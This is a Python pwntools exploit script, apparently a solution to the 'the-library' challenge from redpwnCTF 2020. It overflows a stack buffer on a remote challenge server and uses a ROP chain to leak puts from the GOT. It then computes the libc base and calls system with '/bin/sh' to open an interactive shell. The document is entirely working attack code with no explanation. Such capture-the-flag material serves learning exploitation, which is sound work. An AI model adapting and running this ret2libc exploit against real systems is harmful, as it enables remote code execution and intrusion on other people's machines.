import struct
from pwn import *

host, port = '2020.redpwnc.tf',31350
r = remote(host, port)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc.so.6')
# r = process('./the-library')

offset = 24
main_addr = 0x400637
bss_start = 0x0601040+30
main_puts = 0x0400682
puts_got = 0x0601018
puts_plt = 0x0400520
pop_rdi = 0x0400733
pop_rbp = 0x04005b8
binsh = 0x1b75aa # strings -a -t x libc.so.6 | grep '/bin/sh'
leave_ret = 0x04006bf

fill = b'A'*8+b'B'*8+b'C'*8
fill += p64(pop_rdi)
fill += p64(bss_start)
fill += p64(main_addr)

print(r.recvline())
# pause()
r.sendline(fill)
print(r.recvline())
print(r.recvline())


payload = cyclic(offset)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rbp)
payload += p64(bss_start+20)
payload +=  p64(main_addr)
payload += p64(leave_ret)

print(r.recvline())
r.sendline(payload)
print(r.recvline())
print(r.recvline())

#--------- setup exploit ---------
leak = r.recvline()[:-1]
leak = struct.unpack('q', leak.ljust(8, b'\x00'))[0]
base = leak - libc.sym['puts']
system = (base + libc.sym['system'])
sh = base + libc.search('/bin/sh\x00').next()
log.info('PUTS: {}'.format(hex(leak)))
log.info('BASE : {}'.format(hex(base)))
log.info('SYSTEM: {}'.format(hex(system)))
log.info('BINSH : {}'.format(hex(sh)))
#----------------------------------

exploit = cyclic(offset)
exploit += p64(pop_rdi)
exploit += p64(sh)
exploit += p64(system)

print(r.recvline())
r.sendline(exploit)

r.interactive()